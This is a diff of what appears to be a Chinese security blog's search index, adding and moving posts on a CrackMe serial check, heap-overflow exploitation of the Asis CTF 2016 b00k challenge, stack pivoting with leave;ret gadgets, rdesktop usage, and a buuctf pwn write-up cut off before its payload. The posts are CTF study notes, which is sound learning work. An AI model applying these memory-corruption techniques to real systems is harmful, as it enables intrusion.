@@ -408,54 +408,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CrackMe-Day12</title>
-    <url>/2020/03/09/CrackMe-Day12/</url>
-    <content><![CDATA[<h1 id="CrackMe12"><a href="#CrackMe12" class="headerlink" title="CrackMe12"></a>CrackMe12</h1><p>第十二道CrackMe</p>
-<p>作者attackiko</p>
-<p>这次的程序没有做出来，直接看了别人的WP，链接在最下面</p>
-<a id="more"></a>
-
-<h2 id="程序运行状态"><a href="#程序运行状态" class="headerlink" title="程序运行状态"></a>程序运行状态</h2><p>程序本身的样子就是一个简单的窗口，只有一个输入和一个按键</p>
-<p><a href="./image-20200309172308082.png"></a></p>
-<p>输入错误后获得一个弹窗</p>
-<img src="/2020/03/09/CrackMe-Day12/image-20200309172335715.png" class="">
-
-
-
-<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>有点奇怪，拖入OD分析的时候出现了这样的一个弹窗</p>
-<img src="/2020/03/09/CrackMe-Day12/image-20200309172453445.png" class="">
-
-<p>用Exeinfo看了一下</p>
-<img src="/2020/03/09/CrackMe-Day12/image-20200309181655765.png" class="">
-
-<p>也提示不是Windows PE，有点奇怪，直接在命令行看一下</p>
-<img src="/2020/03/09/CrackMe-Day12/image-20200309181743824.png" class="">
-
-<p>得，居然是DOS的程序</p>
-<p>于是我搜索了一下怎么分析DOS程序，更确切的说是NE程序，这种程序是在Windows 9X年代的</p>
-<p>具体动态分析时网上建议的环境是<code>win95+TRW2000</code></p>
-<p>这还要专门装虚拟机就有点麻烦了，毕竟16位的程序一般也很少见了，这年头32位的程序都要逐渐被淘汰了，不过如果不能动态跑起来，至少看一下别人的WP达到能看懂的程度吧。</p>
-<h2 id="WP学习"><a href="#WP学习" class="headerlink" title="WP学习"></a>WP学习</h2><p>首先还是根据错误字符串定位程序的关键代码入口</p>
-<p>逆向的代码里看到有很多浮点运算相关的汇编指令，平常用的不是很多</p>
-<p>大致流程看别人的write up梳理的很清楚</p>
-<ol>
-<li>获取所有字符求和记为<code>ldsum</code>，长度记为<code>len</code></li>
-<li>计算<code>cos(ldsum(sqrt(ldsum*d1)+ln(ldsum/2))+sin(len)*cos(len*ldsum))</code></li>
-<li>将结果作为科学计数法保存为字符串，记录E前面的17位为一个长度17的字符串记为S17</li>
-<li>通过17位中的8位进行一个简单的加减法，得到一个新的9位记为S9</li>
-<li>上面9位的结果S9所有字符ASC求和+len和<code>9*S17[4]+4*S17[5]+20</code>比较是否相等</li>
-</ol>
-<p>看到的一个教程贴，这里先mark一下吧，这道题看上去挺复杂的，之后进一步学习可以再对着学一下<a href="https://www.52pojie.cn/thread-906688-1-1.html">https://www.52pojie.cn/thread-906688-1-1.html</a></p>
-]]></content>
-      <categories>
-        <category>CrackMe</category>
-      </categories>
-      <tags>
-        <tag>hack</tag>
-        <tag>re</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CrackMe-Day11</title>
     <url>/2020/03/08/CrackMe-Day11/</url>
     <content><![CDATA[<h1 id="CrackMe11"><a href="#CrackMe11" class="headerlink" title="CrackMe11"></a>CrackMe11</h1><p>第十一道CrackMe</p>
@@ -534,6 +486,54 @@
 
 
 
+]]></content>
+      <categories>
+        <category>CrackMe</category>
+      </categories>
+      <tags>
+        <tag>hack</tag>
+        <tag>re</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CrackMe-Day12</title>
+    <url>/2020/03/09/CrackMe-Day12/</url>
+    <content><![CDATA[<h1 id="CrackMe12"><a href="#CrackMe12" class="headerlink" title="CrackMe12"></a>CrackMe12</h1><p>第十二道CrackMe</p>
+<p>作者attackiko</p>
+<p>这次的程序没有做出来，直接看了别人的WP，链接在最下面</p>
+<a id="more"></a>
+
+<h2 id="程序运行状态"><a href="#程序运行状态" class="headerlink" title="程序运行状态"></a>程序运行状态</h2><p>程序本身的样子就是一个简单的窗口，只有一个输入和一个按键</p>
+<p><a href="./image-20200309172308082.png"></a></p>
+<p>输入错误后获得一个弹窗</p>
+<img src="/2020/03/09/CrackMe-Day12/image-20200309172335715.png" class="">
+
+
+
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>有点奇怪，拖入OD分析的时候出现了这样的一个弹窗</p>
+<img src="/2020/03/09/CrackMe-Day12/image-20200309172453445.png" class="">
+
+<p>用Exeinfo看了一下</p>
+<img src="/2020/03/09/CrackMe-Day12/image-20200309181655765.png" class="">
+
+<p>也提示不是Windows PE，有点奇怪，直接在命令行看一下</p>
+<img src="/2020/03/09/CrackMe-Day12/image-20200309181743824.png" class="">
+
+<p>得，居然是DOS的程序</p>
+<p>于是我搜索了一下怎么分析DOS程序，更确切的说是NE程序，这种程序是在Windows 9X年代的</p>
+<p>具体动态分析时网上建议的环境是<code>win95+TRW2000</code></p>
+<p>这还要专门装虚拟机就有点麻烦了，毕竟16位的程序一般也很少见了，这年头32位的程序都要逐渐被淘汰了，不过如果不能动态跑起来，至少看一下别人的WP达到能看懂的程度吧。</p>
+<h2 id="WP学习"><a href="#WP学习" class="headerlink" title="WP学习"></a>WP学习</h2><p>首先还是根据错误字符串定位程序的关键代码入口</p>
+<p>逆向的代码里看到有很多浮点运算相关的汇编指令，平常用的不是很多</p>
+<p>大致流程看别人的write up梳理的很清楚</p>
+<ol>
+<li>获取所有字符求和记为<code>ldsum</code>，长度记为<code>len</code></li>
+<li>计算<code>cos(ldsum(sqrt(ldsum*d1)+ln(ldsum/2))+sin(len)*cos(len*ldsum))</code></li>
+<li>将结果作为科学计数法保存为字符串，记录E前面的17位为一个长度17的字符串记为S17</li>
+<li>通过17位中的8位进行一个简单的加减法，得到一个新的9位记为S9</li>
+<li>上面9位的结果S9所有字符ASC求和+len和<code>9*S17[4]+4*S17[5]+20</code>比较是否相等</li>
+</ol>
+<p>看到的一个教程贴，这里先mark一下吧，这道题看上去挺复杂的，之后进一步学习可以再对着学一下<a href="https://www.52pojie.cn/thread-906688-1-1.html">https://www.52pojie.cn/thread-906688-1-1.html</a></p>
 ]]></content>
       <categories>
         <category>CrackMe</category>
@@ -2265,6 +2265,176 @@
       </tags>
   </entry>
   <entry>
+    <title>Heap-Pwn</title>
+    <url>/2020/09/19/Heap-Pwn/</url>
+    <content><![CDATA[<h2 id="堆基本知识"><a href="#堆基本知识" class="headerlink" title="堆基本知识"></a>堆基本知识</h2><p>堆是可以提供动态分配的内存，在程序虚拟地址中是一块连续的线性空间，从低地址向高地址增长，管理堆的程序被称为堆管理器；</p>
+<p>在linux pwn里面一般关注的是ptmalloc2，是glibc2.3以后集成的堆管理器。</p>
+<p>需要注意的是，在linux中有这样一个基本的内存管理思想：</p>
+<blockquote>
+<p><strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong></p>
+</blockquote>
+<h3 id="堆的基本函数"><a href="#堆的基本函数" class="headerlink" title="堆的基本函数"></a>堆的基本函数</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="keyword">size_t</span> n);</span><br></pre></td></tr></table></figure>
+
+<p>关于malloc需要注意的是：</p>
+<ol>
+<li>malloc返回的是对应内存块的指针</li>
+<li>当n为0时，返回当前系统允许的堆最小内存块</li>
+<li>当n为负数时，由于大多数系统中<code>size_t</code>是一个无符号数，所以会分配很大一块空间，但是一般情况下都会失败；</li>
+</ol>
+<h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(<span class="keyword">void</span> *p);</span><br></pre></td></tr></table></figure>
+
+<p>和malloc可以说是一个对应关系，free用于释放内存块</p>
+<ol>
+<li>p为空指针时不进行任何操作；</li>
+<li>p已经被释放后，再次释放会导致乱七八糟的效果(double free)</li>
+<li>如果释放的空间很大，一般会直接还给系统以减小程序占用的空间，除非禁用<code>mallopt</code></li>
+</ol>
+<h3 id="背后的系统调用"><a href="#背后的系统调用" class="headerlink" title="背后的系统调用"></a>背后的系统调用</h3><p>malloc函数和free函数是程序猿编程时调用的程序，但是实际上背后运行的并不是这些东西，而是通过更简单的函数系统调用实现的</p>
+<h4 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h4><p>brk函数实际上执行的操作很简单，就是移动堆的指针，有些类似于移动esp的函数；</p>
+<p>通过移动栈上的esp就可以让栈增大或缩小，同理移动brk用于控制堆的大小。</p>
+<p><img src="./program_virtual_address_memory_space.png" alt="程序内存布局"></p>
+<p>brk函数和start_brk最初指向的地址是一致的，都位于bss段向上一个随机偏移（如果不开启ASLR则是直接在bss段的结尾）</p>
+<p>brk通过移动heap的顶端来实现heap的扩容和回收</p>
+<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>mmap就是memory map，从名字看也是和内存管理相关的；</p>
+<p>mmap的好处在于可以分配私有匿名的内存空间</p>
+<p>mmap的可以用来在虚拟内存地址空间中分配地址空间，创建和物理内存的映射关系；</p>
+<p>映射关系可以分文件映射和匿名映射两种，文件映射是文件映射进虚拟内存，匿名映射则是一片全0的空间；又可以根据共享方式分为私有映射和共享映射，其中私有映射是这个进程独有的，其他进程无法读写修改，也不会反应到物理内存中；因此总结一下一共存在四种映射。</p>
+<p>这里用一个例子来看一下mmap和对应的munmap函数对进程虚拟内存的影响；在linux中可以查看<code>/proc/pid/maps</code>来看内存的布局</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = <span class="literal">NULL</span>;</span><br><span class="line">        addr = mmap(<span class="literal">NULL</span>, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">                errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unmap mapped region. */</span></span><br><span class="line">        ret = munmap(addr, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">                errExit(<span class="string">&quot;munmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After munmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行的程序就是这样简单的调用mmap和munmap，可以趁程序在getchar等待输入的时候查看内存布局</p>
+<p><img src="./image-20200923073653910.png" alt="munmap前后内存区域差异"></p>
+<p>这里面框出来的两个就是munmap执行前后的差别；</p>
+<p>在ctfwiki里面写到运行的结果</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br><span class="line"></span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e00000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>
+
+<p>这应该是运行在32位系统下的效果，mmap分配的匿名空间在b7开头的地址空间；</p>
+<p>而图中测试在64位下，mmap分配的区域在7f开头的内存空间，和加载的so文件比较接近</p>
+<hr>
+<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>堆溢出和栈溢出的差异在于，堆上不存在可以直接影响控制流的返回地址，因此一般无法直接通过堆溢出控制EIP</p>
+<p>漏洞利用的思路一般是：</p>
+<ol>
+<li>寻找堆分配函数</li>
+<li>寻找危险函数</li>
+<li>确定填充长度</li>
+</ol>
+<h4 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h4><p>堆分配函数一般是malloc、calloc、realloc等；</p>
+<p>其中calloc在分配内存区域之后会将其置0；</p>
+<p>realloc函数则和另外两个有些不同，具有两个参数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">realloc</span>(ptr,size);</span><br></pre></td></tr></table></figure>
+
+<p>根据ptr和size的不同，realloc函数实际执行的效果也是不同的；</p>
+<ul>
+<li><p>当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时</p>
+</li>
+<li><p>如果申请 size &gt; 原来 size</p>
+</li>
+<li><ul>
+<li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小<pre><code>- 如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size) </code></pre>
+</li>
+</ul>
+</li>
+<li><p>如果申请 size &lt; 原来 size</p>
+</li>
+<li><ul>
+<li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变<pre><code>- 如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</code></pre>
+</li>
+</ul>
+</li>
+<li><p>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</p>
+</li>
+<li><p>当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</p>
+</li>
+</ul>
+<h4 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h4><p>危险函数是可能导致泄漏信息或是溢出的函数</p>
+<p>包括：</p>
+<ul>
+<li>gets、scanf、vscanf</li>
+<li>sprintf</li>
+<li>strcpy、strcat、bcopy</li>
+</ul>
+<p>等</p>
+<h4 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h4><p>malloc函数执行时实际分配的内存和请求的数量未必是相同的；</p>
+<p>因为ptmalloc在内存分配时是按照系统2倍最小字长进行对齐的；</p>
+<p>也就是说32位系统按照8字节对齐，64位系统按照16字节对齐。</p>
+<h4 id="特殊的堆溢出"><a href="#特殊的堆溢出" class="headerlink" title="特殊的堆溢出"></a>特殊的堆溢出</h4><p>有时候会出现一个字节的溢出，这一般是边界检查不严格造成的，这一般称为off-by-one漏洞。</p>
+<p>off-by-one漏洞的利用思路：</p>
+<ol>
+<li>溢出字节为任意字节时可能通过修改下一个块结构的大小导致结构重叠，进而泄漏数据或是覆盖其他块的数据；</li>
+<li>溢出字节为NULL字节时，可以使得下一个块的<code>prev_in_use</code>位被清零，这样前块被认为是free，这时可以<ol>
+<li>unlink进行处理；</li>
+<li>或是伪造<code>prev_size</code>导致块间重叠；</li>
+</ol>
+</li>
+</ol>
+<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>以几道CTF来练一下手</p>
+<h4 id="Asis-CTF-2016-b00k"><a href="#Asis-CTF-2016-b00k" class="headerlink" title="Asis CTF 2016 b00k"></a>Asis CTF 2016 b00k</h4><p>首先检查程序的安全机制</p>
+<p><img src="heap-overflow/image-20200926194107247.png"></p>
+<p>是一个64位程序，并且除了gs，其他几个安全机制都开启了</p>
+<p>运行一下程序，功能是一个图书管理的程序</p>
+<p><img src="heap-overflow/image-20200926202511078.png" alt="image-20200926202511078"></p>
+<p>反编译得到main函数的伪代码</p>
+<p><img src="heap-overflow/image-20200926195340455.png" alt="image-20200926195340455"></p>
+<p>点开每一个具体的函数之后，可以发现其中读取文字内容时是使用到了程序自己定义的一个新函数</p>
+<p><img src="heap-overflow/image-20200927204517434.png" alt="image-20200927204517434"></p>
+<p>我们暂且将其称为<code>new_read</code></p>
+<p><img src="heap-overflow/image-20200927204730211.png" alt="image-20200927204730211"></p>
+<p>可以看到这个函数在调用时，第一个参数是指向一个缓冲区的指针；</p>
+<p>第二个参数是要读入的长度，减去了一个null byte，这样的读是没有问题的</p>
+<p><img src="heap-overflow/image-20200927213357312.png" alt="image-20200927213357312"></p>
+<p>但是对于修改author name的函数，在调用这个read时设置的长度忘记了减一，这里有可能存在一个byte的溢出</p>
+<p>设置author name为一个32字节长的内容</p>
+<p>之后创建一个book之后，调用第四个方法print</p>
+<p>就会出现这样的效果</p>
+<p><img src="heap-overflow/image-20200928094900882.png" alt="image-20200928094900882"></p>
+<p>看到除了author name之外还出现了一些其他的字符串</p>
+<p>在Create book的函数中，实际分配图书的结构部分代码如下：</p>
+<p><img src="heap-overflow/image-20200928110059338.png" alt="image-20200928110059338"></p>
+<p>存储的位置是在off_202010这个地方的指向的位置</p>
+<p><img src="heap-overflow/image-20200928110142911.png" alt="image-20200928110142911"></p>
+<p>也就是从202060开始的区域，而这里可以看到author_name的字符串是存储在202040开始的0x20个字节处的，因此溢出1个字节正好可以覆盖掉第一个book的结构体中id这样的一个字段中的值</p>
+<p>利用的思路：</p>
+<ol>
+<li>使author name长度为32</li>
+<li>创建book1，覆盖掉author name最后的NULL byte；并且要让book的description占比较大的空间，在其中伪造一个book结构</li>
+<li>调用print泄漏第一个book结构的地址</li>
+<li>创建第二个book</li>
+<li>更改author name，再次覆盖掉book1的一个字节，这样使得其指向的空间变大，并且指向了book1的description部分，实际上是一个伪造的book</li>
+<li>由于有edit函数和print函数，且book1中伪造的book是可控的，导致实际上可以任意地址读写</li>
+</ol>
+<p>首先读到地址</p>
+<p><img src="heap-overflow/image-20200929210106951.png" alt="image-20200929210106951"></p>
+<p>这边转换之后得到一个数字，连接到gdb里面查看一下内存</p>
+<p><img src="heap-overflow/image-20200929210131532.png" alt="image-20200929210131532"></p>
+<p>可以看到这一块区域首先是一个1，之后是一个指向<code>0x5433d372b0</code>的指针，紧跟着是一个<code>0x5433d372e0</code>的指针</p>
+<p>输出一下发现<code>b0</code>这里面是32个字节的b；也就是我们输入的书的name区域</p>
+<p><img src="heap-overflow/image-20200929211751690.png" alt="image-20200929211751690"></p>
+<p>之后发现另一个<code>e0</code>这个区域是我们输入的description</p>
+<p><img src="heap-overflow/image-20200929212122897.png" alt="image-20200929212122897"></p>
+<p>有内容的部分包括0，上面有128个字节，之后一个0，一个31；</p>
+<p>我们之前有学过了chunk的结构，首先每一个chunk起始的一个字是存着前一个chunk的size；之后是自己这个chunk的size</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/20044065-905e3579f0f56746.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/703" alt="img"></p>
+<h2 id="Chunk-Extend"><a href="#Chunk-Extend" class="headerlink" title="Chunk-Extend"></a>Chunk-Extend</h2><p>chunk extend在对堆进行扩展时可能会出现overlapping的情况</p>
+<p>即不同的堆块之间造成重叠；</p>
+<p>利用需要以下条件：</p>
+<ul>
+<li>程序中存在基于堆的漏洞</li>
+<li>漏洞可以控制chunk header中的数据</li>
+</ul>
+<p>类似的还有一种利用方式是chunk shrink</p>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>由于在ptmalloc中对堆的各种操作是很频繁的，因此其中的很多操作直接是以宏的形式实现的；</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *)(p))+chunksize(p)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)((char *)(p) - prev_size(p)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p) ((((mchunkptr) (((char *)(p))+chunksize(p))) -&gt; mchunk_size) &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>IDA反编译出错</title>
     <url>/2020/11/06/IDA%E5%8F%8D%E7%BC%96%E8%AF%91%E5%87%BA%E9%94%99/</url>
     <content><![CDATA[<p>用IDA反编译遇到的一些问题和解决方案</p>
@@ -3256,6 +3426,46 @@
 ]]></content>
       <tags>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Stack-Pwn</title>
+    <url>/2020/11/19/Stack-Pwn/</url>
+    <content><![CDATA[<p>学习到的栈相关的内容</p>
+<a id="more"></a>
+
+
+
+<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>首先，在栈溢出发生时栈的一个基本结构是比较简单的</p>
+<p><img src="image-20201119101751227.png" alt="image-20201119101751227"></p>
+<p>如果我们可以溢出的长度比较有限，只能控制ebp以及return address这两个地方</p>
+<p>那么就可以考虑使用栈迁移这样一个技巧</p>
+<p>核心有两个要求：</p>
+<ol>
+<li>能够在内存可执行区域写入一定长度的代码；</li>
+<li>能够控制ebp以及return address</li>
+</ol>
+<p>执行栈迁移时，控制ebp为我们控制的一个地址，return address则填写一个<code>leave;ret;</code>的gadget地址</p>
+<p>leave指令相当于<code>mov esp,ebp;pop ebp</code></p>
+<p>所以整个gadget相当于执行了<code>mov esp,ebp;pop ebp;ret</code></p>
+<p>这样一个gadget实际上做了什么事情呢？</p>
+<p><img src="image-20201119103212438.png" alt="image-20201119103212438"></p>
+<p>首先<code>mov esp,ebp</code>这个指令清空了子函数的栈，esp和ebp现在都指向old ebp的位置</p>
+<p>之后<code>pop ebp</code>将ebp的值设置为栈中保存地址</p>
+<p>最后要执行<code>ret</code>跳转到栈中保存的返回地址处</p>
+<p>如果我们这里控制old ebp为一个其他段，例如bss段中的地址，ret addr中是这个gadget的地址</p>
+<p>在函数第一次执行到返回这样的一个过程中，我们将ebp成功放到了bss段上，但是其实esp还没有被控制</p>
+<p>接下来执行到ret这个地方时又执行了一遍<code>ret addr</code>这里保存的gadget</p>
+<p>第二次的这个过程就让esp变成了我们填写的old ebp的位置的值</p>
+<p>整个这样一个过程，我们通过控制的这样两个值，让esp指向了我们需要的一个位置</p>
+<p>同时ebp其实也是可以控制其中的值的，但是因为它对我们shellcode的执行并没有影响，所以可以随便设置</p>
+]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
@@ -4444,6 +4654,40 @@
       </tags>
   </entry>
   <entry>
+    <title>rdesktop</title>
+    <url>/2019/06/07/rdesktop/</url>
+    <content><![CDATA[<h2 id="rdesktop"><a href="#rdesktop" class="headerlink" title="rdesktop"></a>rdesktop</h2><p>rdesktop是linux下面的远程桌面，可以用来连接windows的rdp服务</p>
+<p>rdp服务一般开3389端口</p>
+<p>在渗透测试时可能经常需要用到</p>
+<p>常用的命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop -u user -p pass 192.168.1.1 -f</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-u参数后面接用户名</li>
+<li>-p参数接密码</li>
+<li>-f选项意思是全屏</li>
+<li>-g 1024*720 不想全屏也可以这样设置分辨率</li>
+</ul>
+<p>除了这几个还有一个比较重要的参数:</p>
+<ul>
+<li>-r 作用是多媒体重定向</li>
+</ul>
+<p>可以通过<code>-r</code>的参数将声卡映射过去，也可以将本地的文件夹映射</p>
+<p>例如：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop -u user -p pass -r disk:aa=/root/Documents [ip]</span><br></pre></td></tr></table></figure>
+
+<p>这样会将linux下面的<code>/root/Documents</code>文件夹在windows中作为一个磁盘出现</p>
+<p>也可以映射成一些其他的东西</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop -u user -p pass -r sound:<span class="built_in">local</span> [ip]</span><br></pre></td></tr></table></figure>
+
+<p>可以将本地的声卡映射过去，这样在远程桌面播放声音时本地这里会响</p>
+]]></content>
+      <tags>
+        <tag>hack</tag>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ping</title>
     <url>/2019/05/21/ping/</url>
     <content><![CDATA[<h1 id="Ping源码分析"><a href="#Ping源码分析" class="headerlink" title="Ping源码分析"></a>Ping源码分析</h1><p>分析的内容为Linux中ip-utils中的ping<br>为网络程序设计这门课要求的小作业</p>
@@ -4629,40 +4873,6 @@
       <tags>
         <tag>linux</tag>
         <tag>coding</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>rdesktop</title>
-    <url>/2019/06/07/rdesktop/</url>
-    <content><![CDATA[<h2 id="rdesktop"><a href="#rdesktop" class="headerlink" title="rdesktop"></a>rdesktop</h2><p>rdesktop是linux下面的远程桌面，可以用来连接windows的rdp服务</p>
-<p>rdp服务一般开3389端口</p>
-<p>在渗透测试时可能经常需要用到</p>
-<p>常用的命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop -u user -p pass 192.168.1.1 -f</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>-u参数后面接用户名</li>
-<li>-p参数接密码</li>
-<li>-f选项意思是全屏</li>
-<li>-g 1024*720 不想全屏也可以这样设置分辨率</li>
-</ul>
-<p>除了这几个还有一个比较重要的参数:</p>
-<ul>
-<li>-r 作用是多媒体重定向</li>
-</ul>
-<p>可以通过<code>-r</code>的参数将声卡映射过去，也可以将本地的文件夹映射</p>
-<p>例如：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop -u user -p pass -r disk:aa=/root/Documents [ip]</span><br></pre></td></tr></table></figure>
-
-<p>这样会将linux下面的<code>/root/Documents</code>文件夹在windows中作为一个磁盘出现</p>
-<p>也可以映射成一些其他的东西</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop -u user -p pass -r sound:<span class="built_in">local</span> [ip]</span><br></pre></td></tr></table></figure>
-
-<p>可以将本地的声卡映射过去，这样在远程桌面播放声音时本地这里会响</p>
-]]></content>
-      <tags>
-        <tag>hack</tag>
-        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
@@ -6277,834 +6487,5 @@
 <h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><p><a href="https://github.com/mo-xiaoxi/EmailSproofingTestTool">https://github.com/mo-xiaoxi/EmailSproofingTestTool</a></p>
 <p><a href="https://chrome.google.com/website/detail/nosproofing/ehidaopjcnapdglbbbjgeoagpophfjnp">https://chrome.google.com/website/detail/nosproofing/ehidaopjcnapdglbbbjgeoagpophfjnp</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>[buuctf]-pwn1</title>
-    <url>/2020/05/21/buuctf-pwn1/</url>
-    <content><![CDATA[<p>前一段时间做毕设，平常就没太多时间做别的东西了，现在暂时没有那么忙了</p>
-<p>就准备继续学一些pwn和reverse的东西，每天刷上一些题吧</p>
-<p>这个文档准备写所有的1分pwn题的wp</p>
-<p>由于还没写完，里面的有些图片还没设置好，网上看应该是看不了的</p>
-<a id="more"></a>
-
-<h2 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h2><p>首先程序拖到IDA看一下代码</p>
-<p><img src="image-20200521120905993.png"></p>
-<p><code>main</code>函数的内容就这么短，是一个<code>gets</code>引起的溢出，看到这个<code>char s</code>距离rbp有Fh</p>
-<p>侧边看到还有一个fun函数</p>
-<p><img src="image-20200521121055537.png"></p>
-<p>内容直接返回了一个shell</p>
-<p>栈内的数据由近到远依次是局部变量、rbp，最后是返回地址</p>
-<p>应该要覆盖返回地址到fun函数这里，这个值是<code>0x401186</code></p>
-<p>需要覆盖fh个字节的数组s的空间，以及8个字节的ebp</p>
-<p>最后填写返回地址</p>
-<p>按照这个逻辑写出来的payload是下面这样的</p>
